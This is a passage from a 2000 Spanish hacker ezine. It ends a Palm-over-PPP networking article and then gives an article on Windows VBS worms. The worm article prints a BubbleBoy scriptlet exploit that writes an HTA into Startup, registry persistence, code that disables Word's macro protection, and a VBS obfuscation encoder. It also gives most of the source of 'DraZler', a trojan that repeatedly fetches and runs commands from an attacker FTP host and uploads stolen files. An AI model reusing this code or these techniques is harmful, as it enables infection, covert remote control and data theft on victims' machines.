Linux, pero no igual. De hecho, por la poca documentacion existente casi los
mismos pasos han costado un poco mas.

Para empezar, y al igual que en Linux, necesitamos que el kernel traiga
soporte para gateway osease, firewalling y forwarding.

options         INET                    #InterNETworking
options         IPFIREWALL              #packet filtering
options         IPFIREWALL_VERBOSE      #logging of packets through syslogd
options         IPFIREWALL_VERBOSE_LIMIT=10 #num max logging packets

El resto de opciones necesarias ya vienen en el fichero de conf del nucleo 
generico. Las tres ultimas se deben de poner porque con el generico, por lo 
menos en la version 4.0 de la FreeBSD, no vienen.

En la opcion:

        options 		IPFIREWALL_VERBOSE_LIMIT=10

el numero seria acertado que estuviere entre 10 y 100.

Ahora creamos el enlace simbolico ya comentado anteriormente:

                ln -s /dev/pilot /dev/ttyd0 (o ttyd1)

Y activamos la opcion de forwarding. Dos maneras:

        a)  Añadir linea: gateway_enable="YES" al fichero /etc/rc.conf 

        b)  O desde la shell: sysctl -w net.inet.ip.fw.enable=1 

La diferencia reside en que con el a) esta ya para siempre activado, no asi en 
el b) que habra que teclearlo cada vez que se encienda el ordenador.

Lo curioso de la FreeBSD es que cuando se activa la opcion de firewalling, el
nucleo, por defecto, pilla el file por defecto de /etc que
normalmente filtra todos los paquetes de todos los dispositivos y no
deja pasar absolutamente nada por ningun lado. NO como en linux. Por lo que nos
toca dar un paso intermedio.

En el fichero /etc/rc.conf tenemos que añadir lo siguiente:

gateway_enable="YES"  
firewall_enable="YES"
firewall_script="/etc/firewall/fwrules"

La primera linea ya la habiamos puesto anteriormente. En las otras dos, la 
primera nos permite trabajar con ipfw (ipchains en linux) y la segunda
nos permite pasarle las rules al ipfw desde un file (ipchains-restore en linux)
Una vez añadidas estas lineas creamos directorio en /etc llamado 'firewall':

	mkdir /etc/firewall

y creamos alli el fichero 'fwrules' que va a contener:

--- CUT ----

 # Firewall rules
 # QuasaR of UNDERSEC Security Team
 # Gracias a Marc Silver (marcs@draenor.org)
 
 # Definimos un alias sobre el que trabajar

 fwcmd="/sbin/ipfw"

 # Borramos las rules que podamos tener establecidas de antemano. Nunca se
 # sabe y asi nos ahorramos un huevo de problemas.

 $fwcmd -f flush
 
 # Y ahora voy a piñon, lo dejo pasar absolutamente todo

 $fwcmd add allow ip from any to any via lo0
 $fwcmd add allow ip from any to any via ed0
 $fwcmd add allow ip from any to any via ppp0    

--- EOF ----


Si, ya se que he dejado pasar todo. Pero es que no me quiero enrollar ahora
explicando rules y tal. Que cada uno se lo haga a medida.
Y ahora ya podemos ejecutar el pppd al serial. Funciona exactamente igual que
en linux. Por lo que la opcion seria (mas info ver seccion linux):

	pppd /dev/pilot 57600 :ipdepalm local crtscts passive proxyarp noauth

Y con esto, la palm deberia de funcionar perfectamente. Salvo follones con las 
rutas estaticas del route. Estad atentos. Pero ya digo que deberia de 
funcionar. Solo le hace falta el connect de la palm para que se conecte.


CURIOSIDADES
-------------

Una vez conectada la palm al ordenador, en plataformas windows no permite 
encontrar la palm como un dispositivo a parte del propio windows.
Sin embargo , no ocurre igual desde el resto de plataformas.
En el resto de plataformas (entiendase Linux y FreeBSD) al asignarle una ip 
e incluso una direccion MAC a la palm, esta se considera como un dispositivo 
aparte, puediendose acceder a traves de la ip. Esto nos permite usar scaneos, 
pings, traceroutes y cualquier otra utilidad de red contra la palm. Y es
entonces cuando nos encontramos con las cosas mas curiosas.
Es divertido ver como un traceroute desde la RH pasa por la FreeBSD y 
llega hasta la palm. O el camino contrario, Ver como la palm accede al IRC 
desde la FREEBSD pasando por NAT por la RH.

Ejemplillo?:

NOTESE que estoy desde quasar (RH) pasa por nekroid (FreeBSD) y llega a
INET.

[root@quasar ~]# traceroute palm
traceroute to palm.undersec.org (192.168.2.5), 30 hops max, 38 byte packets
 1  nekroid (192.168.2.4)  2.212 ms  1.129 ms  1.233 ms
 2  palm (192.168.2.5)  35.443 ms  36.549 ms  34.745 ms
[root@quasar ~]# 
  
Mas cosillas. La palm es ahora un terminal en la red y claro, soporta tcp.
MMMMMmm... sera nukeable?. Correcto si. Cualquier nuke con igmps o flood deja 
la palm completamente tostada!. La pila TCP/IP no es ninguna maravilla y claro
sale a relucir. De hecho, hasta un scanneo de fingerprints del nmap la deja
tostada. 

Hablando de tostamientos, recomiendo la utilidad crash.prc que detecta un crash
y resetea la palm en caliente por ti, sin darle la vuelta y darle al
boton de reset. Busquese la susodicha utilidad en http://www.palmgear.com
por ese mismo nombre.

Podria seguir explicando cosillas, como lo de las passwords vulnerables en
el backup de la palm en el file Unsaved_Preferences.prc pero casi que esto
es otra historia.... ;)


CONCLUSIONES
--------------

El bichito llamado palm es una maravilla y eternamente flexible aunque debe 
quedar claro que esta concebida como agenda personal y nunca hay que olvidar 
esa idea.

Las pruebas han dado siempre resultado positivo. Se realizaron con los 
los elementos indicados a continuacion:

Palm V - Palm OS 3.3
FreeBSD 4.0 STABLE
Linux Debian 2.2.17



AGRADECIMIENTOS Y SALUDOS
--------------------------

Pues tengo que agradecer eternamente aquellas primeras pruebas que se hicieron
en la benagua party con el superportatil a Pope.

Tengo que agradecer casi el resto de las pruebas sobre Linux a Sp4rk y su
Debian chunga cuando la Hackmeeting.

Tengo que agradecer a mi madre que me diera pelas para poder ir a los sitios
anteriores y poder haber hecho las pruebas.

Y tengo que agradecer a personas mas indirectas el dar animos cuando estas en
momentos de bajon y sin ganas de hacer nada... Neko^_^ , Raise   :*

Y ahora los saludos: UNDERSEC :* (http://www.undersec.com) & Netsearch
(http://www.netsearch-ezine.com) ..... guarris!


DESPEDIDA
-----------

Espero que el articulo sirva a muchas personas y contribuya para que alguien
no se tenga que dejar los cuernos mas....ya me los he dejado yo.

Para cualquier sugerencia o duda estoy en: quasar@netsearch-ezine.com hasta que 
me vuele el correo.

Ta otra....

----
25 - Octubre - 2000



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x07 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ I-Worms en Windows ]-====================================================
=-[ por MoebiuZ ]-===========================================================




===== [ De como este pseudo-SO nos ofrece todo lo necesario para comprometer
 su propia seguridad (nada nuevo). ]


   En los tiempos que corren podemos leer en la prensa, en la television, la
radio... como se habla mucho de virus de Internet, como Melissa, iloveyou...,
que utilizan el correo electronico para entrar en el sistema y "destrozarlo".
Estos gusanos se han extendido por todo el mundo, y son temidos por la
sociedad, aunque realmente no son tan catastroficos como los pintan.

   Pero... cual es la verdadera razon de que se hayan extendido a tan gran
escala? Pues sencillamente que se extienden de la misma forma que se extendio
en su dia el famoso programa de Microsoft, Windows. Todos estos gusanos se
extienden utilizando las herramientas que nos ofrece la propia Microsoft, ya
que solo afectan a las aplicaciones de dicha empresa.

   El virus Melissa, tan famoso el año pasado, utilizaba el lenguaje de macros
de Microsoft Word y la libreta de direcciones de Microsoft Outlook para sus
fines. El mas reciente, iloveu, emplea el scripting de Microsoft Windows, y
aprovecha la fabulosa opcion de esconder las extensiones en el navegador del
sistema para engañar al pobre usuario que sin tener conocimientos basicos sobre
como protegerse de agresiones externas (de lo que no les culpo, ya que la culpa
es de los medios, que cada vez mas se empeñan en asociar la seguridad
informatica a los "chicos malos", y en echarnos la culpa a nosotros cuando la
culpa es de la infima calidad de los productos informaticos que se lanzan al
mercado). Bueno, me dejo de preambulos y comienzo este pequeño vistazo a
algunas de las tecnicas que se emplean para realizar estos ataques, dejando
claro que el problema esta en la falta de seguridad de Windows, y no en la
mente retorcida de ciertos cerebritos que se dedican a reventar maquinas ajenas
por placer. Ni que decir tiene que todo lo que exponga aqui tiene como fin el
conocer como proteger nuestra maquina de este tipo de ataques, no el difundir
como utilizarlo con fines poco eticos. Por ello, ciertas partes del codigo que
muestre estaran incompletas o capadas, para que los script-kiddies no
encuentren aqui su toys'r'us particular.

   Aprobecho tambien este articulo para introducir un "nuevo" (por lo menos yo
no he leido nada parecido hasta ahora) concepto al que he bautizado como
"Troyano Pasivo". Lo comentare al final de este articulo, asi como adjuntare un
sencillo pero poderoso ejemplo que he escrito, llamado DraZler.



===== [ Visual Basic Script (VBS): Los batch de Windows ]

   VBS es un lenguaje de scripting que posee Windows. Seria la version mas
reducida de Visual Basic, seguida de VBA (Visual Basic para Aplicaciones). Son
scripts muy parecidos a JavaScript, y pueden utilizarse como un batch o como
script en una Web, permitiendonos utilizar los controles ActiveX en la Web.

   Una de las reglas basicas para comprometer un sistema es conseguir acceso al
HD del ordenador. Por ello, los scripts de Java o de VB no permiten hacerlo
desde una web. Bueno, miento. Si permiten hacerlo, pero nos saltaria el control
ActiveX preguntando si queremos ejecutar ese codigo, ya que puede comprometer
la seguridad de nuestra maquina.

   Una primera tecnica, un tanto rudimentaria, a mi parecer, es la que utilizo
el gusano iloveu. Se trata de enviar el script como un attachment en un correo
electronico. El incauto usuario posiblemente lo ejecutara, ya que si consulta
la linea del remitente, vera la direccion de un amigo o familiar (ya que el
virus se envia utilizando la libreta de direcciones de la maquina infectada).
Tambien aprovecha las extensiones ocultas de Windows. Llama al archivo
sample.txt.vbs, quedando a la vista unicamente sample.txt, de forma se podria
pensar que nos han enviado un archivo de texto plano. Una vez que el archivo
sea ejecutado, podemos hacer practicamente cualquier cosa en esa maquina.

   Una tecnica mas eficiente, aunque no tan conocida es la que utiliza el
gusano BubbleBoy. Se trata de aprovechar un bug en las librerias de scriptlet
en Internet Explorer 5.0. Dicho fallo nos permite volcar un archivo de texto
plano en el disco duro de la maquina sin que los controles de seguridad de
ActiveX lo revelen. Dicho archivo, colocado de forma estrategica, nos permite
tomar la maquina practicamente al 100%. Este archivo podria ser volcado en el
directorio Inicio de Windows, como una Aplicacion HTML (.hta), de forma que al
reiniciar la computadora este seria ejecutado.


<object classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" id="Infect">
</object> <script language="VBScript"> Infect.Path ="C:\WINDOWS\MENU
INICIO\PROGRAMAS\INICIO\DETONANTE.HTA" Infect.Doc = Chr(13) & "Codigo" &
Chr(13) Infect.Write </script>



   El codigo anterior volcaria el archivo detonante.hta en el directorio inicio
de Windows. En este caso, el archivo no contendria ningun codigo.

  Esto, insertado en un email en formato HTML o en una web, infectaria al
indefenso usuario que lo recibiese con Outlook 5 o que visitase la web con el
explorer. Es mas, si la infeccion llega a traves del email, ni siquiera es
necesario abrir el mensaje, ya que el propio Outlook ejecuta el codigo
Javascript o VBS que contenga al utilizar la vista previa.

   Al reiniciar el sistema, ese detonante seria ejecutado, abriendo una
ventana, en la que se podria escribir un mensaje emulando un error. Y a partir
de ahi, solo bastaria dar rienda suelta a nuestra imaginacion.


   Para parchear esta vulnerabilidad:

   http://support.microsoft.com/support/kb/articles/Q240/3/08.ASP

     
   El ultimo gusano "de moda" ha sido el Life Stages. Este virus aprovecha otra
vulnerabilidad de nuestro querido Windows. Se trata de utilizar el Shell Scrap
de Windows. Se trata de una posibilidad bastante util que permite empaquetar
varios archivos de proceso por lotes en uno solo. El fallo esta en que por
defecto, la extension de estos archivos (SHS) nunca se mostrara, aunque
tengamos activado el Mostrar Extensiones. Esto se debe a la siguiente clave del
registro (que viene por defecto :P):


  HKEY_CLASSES_ROOT\ShellScrap\NeverShowExt

  Para solucionarlo no hay mas que renombrar esta clave por:

  HKEY_CLASSES_ROOT\ShellScrap\AlwaysShowExt


  

==== [ Objetos utiles en VBS ]

   Para escribir un gusano, unvirus o un troyano en VBS, basicamente tenemos
dos objetos importantes. Uno que nos permitira acceder al HD y otro al
registro.


   =-=-= [ Scripting.FileSystemObject ]

   Este objeto contiene diversos metodos que nos permiten leer, y escribir en
los dispositivos de almacenamiento masivo de la maquina.


     Set ManipulacionHD = CreateObject("Scripting.FileSystemObject")


   Para abrir un archivo de texto en modo lectura/escritura lo hariamos del
siguente modo:

     Set MiArchivo = ManipulacionHD.CreateObject("path/del/archivo",1,false)

   [ Nota: Esto no es un curso de VBS, me limitare a exponer como se utilizan
los metodos para nuestros objetivos, pero no explicare para que sirven todos
los parametros. Para eso ya estan los libros y los tutoriales que hay por
Internet ]

   Para escribir en ese archivo:

     MiArchivo.WriteLine("Esta es la primera linea del archivo creado")
     MiArchivo.WriteLine("Esta es la segunda")


   Para leer:

     variable = MiArchivo.ReadLine()

   (el contenido de la variable seria "Esta es la primera linea del archivo")

   Una vez terminada la secuencia, debemos cerrar el archivo para lectura
escritura.

     MiArchivo.Close()


   Podemos tambien borrar un archivo:

     ManipularHD.DeleteFile("path\del\archivo")


   =-=-= [ WScript.Shell ]

   Este objeto nos permite ejecutar programas y acceder al registro.

     Set MiShell = CreateObject("WScript.Shell")


   Para ejecutar un programa:


     MiShell.Run "path/del/binario","0"

   El 0 indica que se debe ejecutar en segundo plano.


   Para escribir en el Registro:

     MiShell.RegWrite "HKEY_...\ruta de la clave\clave", "Contenido"


   y para leer:

     variable = MiShell.ReadReg("HKEY_...\ruta\clave")

   (el contenido de "variable" seria "Contenido")



   Bien, conociendo esto, ya podemos hacer lo que nos propongamos.



===== [ Manipulando el registro ]

   El registro de Windows es, quiza, lo mas interesante de este programa. Desde
alli podemos variar multitud de parametros. Uno de los mas interesantes seria
el de la desactivacion de la proteccion contra virus de Microsoft Word para
posteriores "entradas".


Ejecutar.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\
Options\EnableMacroVirusProtection" , "0"


   En DraZler (el troyano que adjunto al final de este articulo) se vale del
registro para ocultarse a los ojos del usuario de una forma bastante curiosa.
Se trata de cambiar el puntero de trabajo en segundo plano por el mismo que
tiene como puntero normal. De esta forma, puede estar realizando tareas (en
este caso la de conectar una y otra vez a un ftp) sin que el puntero cambie
cada 5 segundos.


Flecha = Ejecutar.RegRead("HKEY_CURRENT_USER\Control Panel\Cursors\Arrow")
Ejecutar.RegWrite "HKEY_CURRENT_USER\Control Panel\Cursors\AppStarting",Flecha


   Tambien tenemos la posibilidad de colocar programas que arranquen cada vez
que se inicia el sistema (del mismo modo que la carpeta inicio). Esta tecnica
es archiconocida, y la utilizaban los vistos hasta la saciedad Netbus y Back
Orifice. Se trata de insertar una clave en alguna de las siguientes rutas del
registro:

HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/Current Version/Run
HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/Current Version/RunOnce
HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/Current Version/RunServices
HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/Current Version/RunservicesOnce


   Ahora solo tienes que rebuscar un poco en el registro y encontraras multitud
de cosas utiles.



===== [ Volcando archivos binarios en el HD ]


   Muchas veces el VBS se nos queda corto para nuestras necesidades, y quiza un
ejecutable lo solucionase, pero tenemos un problema. La gran mayoria de los
usuarios no tienen un compilador de C u otro lenguaje instalado en su maquina,
y aunque lo tuviese, lo mas seguro es que no conociesemos la ruta de dicho
compilador, por lo que seria inutil intentar volcar un codigo fuente para
compilarlo alli, como seria posible en *NIX. Pero hay una solucion que he
comentado anteriormente (Ver NetSearch Ezine No. 2). Se trata de utilizar el
debug del DOS para convertir el codigo hexadecimal de nuestro ejecutable en un
binario.

   Ahora comentare para que lo he utilizado yo en DraZler. Cuando ejecutamos un
programa basado en MSDOS, normalmente se abre una "shell". En el caso de
DraZler, yo necesito utilizar un Batch con un bucle infinito, lo que abre esa
ventana, y lo hace totalmente visible al usuario. Para ello, se me ocurrio
utilizar un acceso directo que apuntase a ese Batch. Si edito las propiedades
de ese acceso directo puedo hacer que no salte la ventana, y activar ciertas
opciones muy utiles, como la de que no avise de que hay un programa MSDOS
corriendo en la maquina al apagar el sistema. Pero... como creo un acceso
directo en una maquina a la que no tengo acceso fisico? Pues muy sencillo, creo
el acceso directo en mi maquina, lo convierto en codigo hexadecimal, y lo
vuelco en la maquina remota mediante un script VBS y debug (ver DraZler).



==== [ Encriptacion ]

    Dado que VBS es un script, el codigo siempre puede ser leido editando el
archivo. Para poner las cosas mas dificiles, siempre podemos utilizar una
pequeña funcion que lo oculte, aunque si el que lo edita es un poco avispado no
tendra ningun problema para descifrarla ;)


[--] Sencillo programa codificador (iworms\encoder.vbs) [--]
<++> iworms/encoder.vbs $5477dfd02a5c77f290ffbad7ee6c4ce4

Cadena = InputBox(Codigo,"MoebiuZ's Simple Encoder","Introduce la frase a
codificar") For Count = 1 To Len(Cadena)
	If Count = 1 Then
		If Len(Asc(Mid(Cadena, Count,1))) = 3 Then
	       		Yimbo = Asc(Mid(Cadena, Count, 1))
		ElseIf Len(Asc(Mid(Cadena, Count, 1))) = 2 Then
			Yimbo = "0" & Asc(Mid(Cadena, Count, 1))
		ElseIf Len(Asc(Mid(Cadena, Count, 1))) = 2 Then
			Yimbo = "00" & Asc(Mid(Cadena, Count, 1))
		End If
	ElseIf Count = Len(Cadena) Then
		If Len(Asc(Mid(Cadena, Count,1))) = 3 Then
	       		Pepo = Asc(Mid(Cadena, Count, 1))
			Yimbo = Yimbo & Pepo
		ElseIf Len(Asc(Mid(Cadena, Count, 1))) = 2 Then
			Pepo = "0" & Asc(Mid(Cadena, Count, 1))
			Yimbo = Yimbo & Pepo
		ElseIf Len(Asc(Mid(Cadena, Count, 1))) = 2 Then
			Pepo = "00" & Asc(Mid(Cadena, Count, 1))
			Yimbo = Yimbo & Pepo
		End If
    	Else
		If Len(Asc(Mid(Cadena, Count,1))) = 3 Then
	       		Pepo = Asc(Mid(Cadena, Count, 1))
			Yimbo = Yimbo & Pepo
		ElseIf Len(Asc(Mid(Cadena, Count, 1))) = 2 Then
			Pepo = "0" & Asc(Mid(Cadena, Count, 1))
			Yimbo = Yimbo & Pepo
		ElseIf Len(Asc(Mid(Cadena, Count, 1))) = 2 Then
			Pepo = "00" & Asc(Mid(Cadena, Count, 1))
			Yimbo = Yimbo & Pepo
		End If
   	End If Next Pringue = InputBox(Unused,"Codigo encriptado",Yimbo)

<-->
[--] FIN encoder.vbs [--]


   Con este sencillo programa podemos codificar una a una las lineas de nuestro
virus, de forma que solo seran secuencias numericas. Hay que decir que algunas
funciones de un script no se pueden codificar o no seran interpretadas
correctamente.
  Una vez tenemos nuestro virus codificado totalmente, solo tenemos que hacer
una funcion que decodifique cada una de las lineas y la interprete como si no
estuviese codificada.


   Function Dec(Code)

   For Count = 1 To Len(Code) Step 3
        If Count = 1 Then
		DCode = Chr(Mid(Code,Count,3))
	Else
		DCode = DCode & Chr(Mid(Code,Count,3))
	End If
   Next

   End Function

           

   Imaginad este sencillo script:


<++> iworms/ejemplo1.vbs $06cbfb18ace839880b380c47b7f436f6

   Msgbox "AQUI SU PUBLICIDAD"

<-->



   Pues encriptado con el codificador anterior quedaria del siguiente modo:
   (la funcion execute debe estar toda en la misma linea)


<++> iworms/ejem1cod.vbs $15179ee612bad0e8f003e07711785634

   Execute(Dec(0771151030981111200320340650810850730320830850320800850660760
   73067073068065068034))

   Function Dec(Code)

     For Count = 1 To Len(Code) Step 3
          If Count = 1 Then
                  DCode = Chr(Mid(Code,Count,3))
          Else
                  DCode = DCode & Chr(Mid(Code,Count,3))
          End If
      Next

   End Function

<-->




===== [ Troyanos Pasivos: DraZler v1.0.0 ]

   Bien, como ya comente al principio, voy a hablar de lo que se me ha dado por
llamar Troyanos Pasivos.

   Hasta ahora estamos acostumbrados a los tristemente famosos troyanos del
tipo cliente/servidor. Infectabas una maquina con el servidor y despues
accedias a ella a traves del cliente, con el cual conectabas conociendo la IP
de la victima. Los inconvenientes de este sistema son ovbios: existe el
problema de conseguir que la victima active un ejecutable en su maquina, y
ademas, necesitamos conseguir su IP mas tarde para poder establecer una
conexion. El 95,5% de las maquinas, digamos, normales, no estan conectadas 24
horas a Internet (aun con la tarifa Plana :P) y tienen una IP dinamica, por lo
que tendriamos que encontrarnos con la victima en el IRC, u otras cosas para
eso.

   La idea de troyano pasivo consiste en que es la maquina infectada la que
conecta a donde el atacante desea, y recoge de alli las instrucciones a seguir.
Por ejemplo, cuando la maquina conecta a Intenet, esta realiza una conexion a
un ftp gratuito donde yo he dejado un script, un batch, o un binario, lo recoge
y lo ejecuta. De esta manera tenemos la maquina controlada sin preocuparnos de
si esta conectado o no, y sin saber su IP.

   Para ilustrar esto, he creado un sencillo programa, completamente en VBS y
Batch. Con ello quiero demostrar dos cosas; que Windows NO ES SEGURO, y que es
posible utilizar los propios recursos de una maquina estandar para introducirse
en ella, sin necesidad de utilizar programas enlatados.

   A continuacion comentare a grandes rasgos y a modo de historia lo que podria
hacer DraZler, pero como siempre he dicho, un codigo fuente es el mejor
tutorial que puedes consultar.


  " Domingo, 12:52 horas.

    Los padres de Selmito acaban de salir de casa para ir a misa de una. El,
como siempre, se habia quedado dormido y no le daba tiempo de llegar, por lo
que se levanta, se ducha, desayuna un poco y corre enseguida a su ordenador
para conectarse a Internet (por fin le han puesto su tarifa plana y tiene que
aprobechar que hoy es "gratis" todo el dia, y asi bajarse el ultimo album de
los Britney Spears). Arranca su flamante Pentium 500 con 128 de RAM y su
querido Windows 98 personalizado hasta los topes. Pincha sobre el icono que
pone Internet y mientras su US Robotic 56K emite unos extraños pero graciosos
soniditos, aprobecha para arrancar su Internet Explorer, su Outlook y su mIRC
para ir ahorrando tiempo.

    Cuando el sonido remite, teclea en su navegador la direccion de Terra para
enviar un mensaje al movil que se acaba de comprar su compañero de clase.

    Mientras carga la Web, pulsa el boton "Enviar y Recibir" en el Outlook,
para bajarse el correo. Selmito esboza, como todos los dias una sonrisita al
ver como su Outlook se baja el correo de la cuenta de su padre y a continuacion
el de la suya. Todavia recuerda como fardo con sus colegas cuando configuro el
solito las dos cuentas en el mismo cliente de correo. De pronto siente una gran
curiosidad al ver que el asunto de uno de los mensajes de su padre dice asi
"IMPORTANTE". Sabe que no debe leerlo porque no es suyo, pero como el entiende
mas de informatica que su padre, decide leerlo por la vista previa y asi
dejarlo como no leido. Pronto pierde el interes al ver que el cuerpo del
mensaje apenas dice una sarta de estupideces sobre el negocio de su padre, el
cual nunca le intereso a el (Eso de ser el editor de una revista del corazon no
es muy divertido).

   En ese momento escucha como alquien esta abriendo la puerta de entrada, y
apaga el ordenador.

   ...

   (Mientras, en las entrañas del Pentium 500 con 128 de RAM)

   El viaje a traves de Internet dando saltos de servidor en servidor lo habia
dejado hecho polvo. Cuando por fin llego a la maquina destino, DraZler, el
pequeño gusano se dejo caer a traves de Outlook en el directorio inicio de
Windows gracias a sus queridas librerias Scriptlet. Por fin encontro una forma
un poco mas comoda en la mutacion HTA. Despues de tan largo viaje a traves de
lineas de cobre, cables de fibra optica y ondas, decidio descansar hasta la
proxima inicializacion del sistema.



   Domingo, 14:23 horas.

   El padre de Selmito enciende el ordenador de casa. Tiene que terminar un
articulo para el Martes, ya que es una gran exclusiva sobre Rodriguez Menendez
que no debe salir antes en ninguna otra publicacion. Abre su Microsoft Word y
comienza a escribir un largo y movidito articulo de 34 paginas, con todo lujo
de detalles. -"La competencia lo va flipar" - se decia a si mismo.

...

   Al arrancar el sistema, DraZler decidio activarse de nuevo, dividiendose en
varios archivos VBS y Batch. Activo en el registro su "despertador", para que
cada vez que iniciase el sistema le despertase. Volco un acceso directo para
despertarse sin "hacer ruido". DraZler pudo comprobar que esta maquina no
estaba todo el dia comunicada con el exterior, asi que decidio realizar una
conexion ftp con la direccion que le habia dado su jefe una y otra vez, hasta
que el canal modulador/demodulador estableciese un enlaze con la RED. Se dio
cuenta de que esto era demasiado "ruidoso", ya que estaba utilizando un Batch
con bucle infinito que llamaba al ftp.exe de Windows, de modo que hizo un
pequeño apaño en el registro tocando los punteros del escritorio para que el
dichoso relojito no apareciese cada dos por tres. Bien, solo quedaba esperar a
que se estableciese esa comunicacion y asi porder recoger las ordenes de su
jefe en el ftp.




   Domingo, 18:36 horas

   Selmito conectaba desesperado su ordenador a Internet, harto ya de hacer los
deberes del Lunes. Ademas, hoy estaba nervioso, habia quedado con una chica en
el IRC, que debia estar para comersela segun la foto que esta le habia enviado.
Se llamaba Sheila.

...

   Al fin! Por fin se abrian las puertas. DraZler se dirigio a
julai.gratisftp.org y alli recogio ord.vbs. Eran las ordenes de su jefe. Este
le pedia el archivo c:\mis documentos\*rod*men*. Pues alli se fue. Por el
camino no pudo evitar fijarse en un directorio llamado "guarras" en c:\windows,
pero no se detuvo. Al llegar a c:\mis documentos encontro un archivo llamado
Rodriguez Menendez.doc. Pues nada, establecio de nuevo una conexion ftp y subio
alli el archivillo.


   Lunes, 13:05 horas

   El padre de Selmito no se lo podia creer. El articulo sobre la boda del
codiciado abogado habia salido en una publicacion de la competencia. Pero como!
Era una exclusiva. Le habian tomado el pelo...

  ...

  DraZler ya se habia asentado y acomodado a este su nuevo hogar, y disfruto de
su trabajo y sus escapaditas esporadicas a julai.gratisftp.com durante un
espacio de 7 meses y 4 dias, hasta que Selmito abrio una foto de Sheila llamada
en_la_ducha.exe y el disco duro de su ordenador comenzo a girar..."



   En fin, despues de este culebron de mierda que acabo de escribir (joder, son
las 4 de la mañana y tengo que levantarme a las 7:30 para ir a clase. Que
esperabais? :P ), solo queda que vosotros mismos veais como funciona este
bichejo. Solo comentar que este es el codigo para infectar la maquina, y que de
ir adjunto en un HTML o en un email para Outlook tiene que ser modificado para
adaptarlo. Por favor, no lo utiliceis, solo es una ilustracion de este
articulo, ademas, posee un fallo que hara sospechar a la persona infectada :P


{[ drazler.vbs ]}
 
+--------------------------------------------------------------------------+
| [Editor: Normalmente no metemos nada en el Ezine que pase de las 80      |
|          columnas, pero este caso es especial, ya que es imposible       |
| 	   partir el codigo sin perder parte de su legibilidad. Por ese    |
|          motivo hemos decidido hacer una excepcion e incluirlo dentro    |
|	   del propio articulo.                                            |
+--------------------------------------------------------------------------+


<++> iworms/drazler.vbs $1e9cfcf82129351c2995573236ab8aac

' DraZler Passive Trojan v1.1.2    VBS/BATCH Coded
'
' Coded by MoebiuZ <moebiuz@netsearch-ezine.com>
'
'
' Infection Sample
'
' DO NOT DISTRIBUTE. THIS IS AN EXPERIMENTAL AND INVESTIGATION SAMPLE
'
'

On Error Resume Next
Set AccesoHD = CreateObject("Scripting.FileSystemObject")
Set Ejecutar = CreateObject("WScript.Shell")

Set DraZ = AccesoHD.CreateTextFile("C:\WINDOWS\drazler.vbs",1,false)
DraZ.WriteLine("On Error Resume Next")
DraZ.WriteLine("Set Ejecutar = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
DraZ.WriteLine("Set AccesoHD = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")")
DraZ.WriteLine("Set Ftp = AccesoHD.CreateTextFile(" & Chr(34) & "C:\draz.bat" & Chr(34) & ",1,false)")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "@echo off" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & ":reiniciar" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo user milogin miclave > C:\rank.sys" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo get done C:\done >> C:\rank.sys" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo get ord.vbs C:\ord.vbs >> C:\rank.sys" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo delete ord.vbs >> C:\rank.sys" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo bye >> C:\rank.sys" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & ":repetir" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if not exist C:\rank.sys goto reiniciar" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "ftp -n -v -s:C:\rank.sys mi.ftp.com" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if exist C:\done goto ejecutar" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "goto repetir" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & ":ejecutar" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if exist C:\ord.vbs wscript C:\ord.vbs" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "del C:\done" & Chr(34) & ")")
DraZ.WriteLine("Ftp.WriteLine(" & Chr(34) & "del C:\rank.sys" & Chr(34) & ")")
DraZ.WriteLine("Ftp.Close()")
DraZ.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DraZler" & Chr(34) & ", " & Chr(34) & "C:\WINDOWS\wscript.exe C:\WINDOWS\dinit.vbs" & Chr(34))
DraZ.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options\EnableMacroVirusProtection" & Chr(34) & " , " & Chr(34) & "0" & Chr(34))
DraZ.WriteLine("Flecha = Ejecutar.RegRead(" & Chr(34) & "HKEY_CURRENT_USER\Control Panel\Cursors\Arrow" & Chr(34) & ")")
DraZ.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_CURRENT_USER\Control Panel\Cursors\AppStarting" & Chr(34) & ", Flecha")
DraZ.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\DraZler\" & Chr(34) & "," & Chr(34) & "An InfoBioGenetic Industries Production." & Chr(34))
DraZ.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\DraZler\NaMe" & Chr(34) & "," & Chr(34) & "DraZler Passive Trojan." & Chr(34))
